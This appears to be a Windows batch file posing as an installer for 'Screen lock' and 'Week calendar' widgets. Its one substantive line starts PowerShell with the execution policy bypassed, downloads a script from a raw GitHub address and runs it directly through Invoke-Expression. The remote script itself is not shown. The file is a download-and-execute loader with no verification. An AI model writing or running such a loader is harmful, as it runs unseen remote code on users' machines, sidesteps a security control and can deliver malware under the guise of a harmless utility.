@echo off
title Windows widgets - setup
echo Installing the widgets "Screen lock" and "Week calendar"...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/777rigaoffice777-hash/windows-widgets/main/install.ps1 | iex"
echo.
echo This window closes in 60 seconds (or press any key).
timeout /t 60 >nul